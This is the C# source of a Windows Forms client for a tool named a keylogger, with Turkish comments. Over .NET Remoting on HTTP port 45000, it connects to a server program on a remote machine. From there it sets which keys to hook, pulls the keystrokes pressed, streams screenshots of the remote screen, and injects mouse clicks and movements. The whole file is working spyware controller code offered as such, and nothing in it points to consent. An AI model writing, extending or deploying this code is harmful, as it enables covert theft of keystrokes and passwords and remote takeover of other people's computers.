using Ibrahim.RemoteObject;
using MaterialSkin.Controls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ibrahim.KeyLogger.Client
{
    public partial class Form1 : MaterialForm
    {
        //Client uygulaması yardımıyla, server uygulamasının çalıştırıldığı
        //makineye erişim sağlanmakta ve o makinenin ekran görüntüsü alınarak
        //klavye fare hareketleri izlenmekte ve yönetilebilmektedir.

        public Form1()
        {
            InitializeComponent();
            
        }

        IKeyLogger proxy;

        private void btnConnect_Click(object sender, EventArgs e)
        {
            //Remoting teknolojisini HttpChannel üzerinden kullanıyoruz.
            HttpChannel channel = new HttpChannel();
            ChannelServices.RegisterChannel(channel, false);

            //server uygulamasına Remoting yardımıyla bağlanıyoruz.
            //Server uygulaması http 45000 portundan yayın yapmaktadır.
            proxy = (IKeyLogger)Activator.GetObject(typeof(IKeyLogger), string.Format("http://{0}:45000/logger", txtIp.Text));

            btnStart.Enabled = true;
            btnStop.Enabled = true;
        }

        //aşağıdaki metod yardımıyla uzak makinede (server uygulamasının çalıştığı makine)
        //basılan tuşlar tuslar.txt dosyasına kaydedilmektedir.
        void SaveHookedKeys(int[] keys)
        {
            if (File.Exists("tuslar.txt"))
                File.Delete("tuslar.txt");
            FileStream fs = new FileStream("tuslar.txt", FileMode.Create);
            StreamWriter sw = new StreamWriter(fs);
            foreach (int key in keys)
            {
                sw.WriteLine(key);
            }
            sw.Close();
            fs.Close();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //Uzak makine dinlemesi başlatılıyor.
            proxy.Start();
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            timer1.Enabled = true;

            //ListBox içerisinden seçilenleri server'a gönder
            int[] keysForHook = new int[lstKeys.SelectedItems.Count];
            int index = 0;
            foreach (KeyInfo item in lstKeys.SelectedItems)
            {
                keysForHook[index++] = item.Ascii;
            }
            //Hazırlanan tuş listesini sunucuya gönder
            proxy.SetHookedKeys(keysForHook);


            //Takip edilecek tuşlar diske kaydediliyor
            SaveHookedKeys(keysForHook);

        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            proxy.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            timer1.Enabled = false;
        }

        KeyInfo prevKey = new KeyInfo(0, "");
        private void timer1_Tick(object sender, EventArgs e)
        {
            //Timer yardımıyla uzak makineden belli aralıklarla son basılan tuş çekiliyor.
            KeyInfo key = proxy.GetLastKey();
            if (key == null)
                return;
            if (prevKey.PressDate != key.PressDate)
            {
                txtKeys.Text += string.Format("<{0}-{1}>", key.KeyName, key.Ascii);
                prevKey = key;
            }

        }

        int[] GetHookedKeys()
        {
            //tuslar.txt dosyasından basılan tuş listesi çekiliyor.
            List<int> keys = new List<int>();
            if (File.Exists("tuslar.txt"))
            {
                FileStream fs = new FileStream("tuslar.txt", FileMode.Open);
                StreamReader reader = new StreamReader(fs);
                string line = "";
                while ((line = reader.ReadLine()) != null)
                {
                    keys.Add(Int32.Parse(line));
                }
                reader.Close();
                fs.Close();
            }
            return keys.ToArray();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            List<KeyInfo> keys = new List<KeyInfo>();
            foreach (int ascii in Enum.GetValues(typeof(Keys)))
            {
                keys.Add(new KeyInfo(ascii, Enum.GetName(typeof(Keys), ascii)));
            }

            lstKeys.DataSource = keys;


            //Daha önce tercih edilmiş tuşları seçili hale getirelim

            int[] keyForHook = GetHookedKeys();

            for (int i = 0; i < lstKeys.Items.Count; i++)
            {
                KeyInfo key = lstKeys.Items[i] as KeyInfo;
                //Eğer dosyadan gelen tuşlarda şu an incelediğimiz Listbox item'ı varsa seçili hale getir.
                if (keyForHook.Contains(key.Ascii))
                {
                    lstKeys.SelectedItems.Add(lstKeys.Items[i]);
                }
            }

        }

        private void tmrScreen_Tick(object sender, EventArgs e)
        {
            //Uzak makinenin ekran görüntüsü alınıyor. Ekran görüntüsü byte olarak
            //serileştirilmiş bir şekilde elde ediliyor.
            byte[] buffer = proxy.GetScreenImage();
            //byte array to Bitmap
            MemoryStream ms = new MemoryStream(buffer);
            Image bmp = Bitmap.FromStream(ms);
            pbScreenPreview.Image = bmp;
        }

        double xRatio=0.0;
        bool preview = false;
        private void btnGetRemoteScreen_Click(object sender, EventArgs e)
        {
            //Uzak sunucunun ekran çözünürlüğüne göre alınan ekran görüntüsü
            //picturebox'ın boyutlarına uygun hale getiriliyor.
            Size remoteSize = proxy.GetRemoteScreenSize();
            xRatio = (double)remoteSize.Width / (double)pbScreenPreview.Width;
            pbScreenPreview.Height = (int)(remoteSize.Height / xRatio);
            tmrScreen.Enabled = true;
            btnGetRemoteScreen.Enabled = false;
            btnStopRemoteScreen.Enabled = true;

            preview = true;
        }

        private void btnStopRemoteScreen_Click(object sender, EventArgs e)
        {
            tmrScreen.Enabled = false;
            btnGetRemoteScreen.Enabled = true;
            btnStopRemoteScreen.Enabled = false;
            preview = false;
        }

        private void pbScreenPreview_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            //Uzak makinenin ekran görüntüsünün izlendiği picturebox üzerinde yapılan
            //fare hareketleri uzak makineye gönderiliyor.
            if (!preview)
                return;
            proxy.SendMouseEvent(MouseEventType.LeftDown, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            proxy.SendMouseEvent(MouseEventType.LeftUp, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            proxy.SendMouseEvent(MouseEventType.LeftDown, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            proxy.SendMouseEvent(MouseEventType.LeftUp, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
        }

        private void pbScreenPreview_MouseDown(object sender, MouseEventArgs e)
        {
            //Uzak makinenin ekran görüntüsünün izlendiği picturebox üzerinde yapılan
            //fare hareketleri uzak makineye gönderiliyor.
            if (!preview)
                return;
            if(e.Button==MouseButtons.Left)
            {
                proxy.SendMouseEvent(MouseEventType.LeftDown, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            }
            else if(e.Button==MouseButtons.Right)
            {
                proxy.SendMouseEvent(MouseEventType.RightDown, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            }
        }

        private void pbScreenPreview_MouseMove(object sender, MouseEventArgs e)
        {
            //Uzak makinenin ekran görüntüsünün izlendiği picturebox üzerinde yapılan
            //fare hareketleri uzak makineye gönderiliyor.
            if (!preview)
                return;
            proxy.SendMovePosition(new Point((int)(e.X*xRatio),(int)(e.Y*xRatio)));            
        }

        private void pbScreenPreview_MouseUp(object sender, MouseEventArgs e)
        {
            //Uzak makinenin ekran görüntüsünün izlendiği picturebox üzerinde yapılan
            //fare hareketleri uzak makineye gönderiliyor.
            if (!preview)
                return;
            if (e.Button == MouseButtons.Left)
            {
                proxy.SendMouseEvent(MouseEventType.LeftUp, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            }
            else if (e.Button == MouseButtons.Right)
            {
                proxy.SendMouseEvent(MouseEventType.RightUp, (uint)(e.X * xRatio), (uint)(e.Y * xRatio));
            }
        }

        private void btnRemoteStart_Click(object sender, EventArgs e)
        {
            pbScreenPreview.MouseDoubleClick += pbScreenPreview_MouseDoubleClick;
            pbScreenPreview.MouseDown += pbScreenPreview_MouseDown;
            pbScreenPreview.MouseMove += pbScreenPreview_MouseMove;
            pbScreenPreview.MouseUp += pbScreenPreview_MouseUp;
        }

        private void btnRemoteStop_Click(object sender, EventArgs e)
        {
            pbScreenPreview.MouseDoubleClick -= pbScreenPreview_MouseDoubleClick;
            pbScreenPreview.MouseDown -= pbScreenPreview_MouseDown;
            pbScreenPreview.MouseMove -= pbScreenPreview_MouseMove;
            pbScreenPreview.MouseUp -= pbScreenPreview_MouseUp;
        }
    }
}
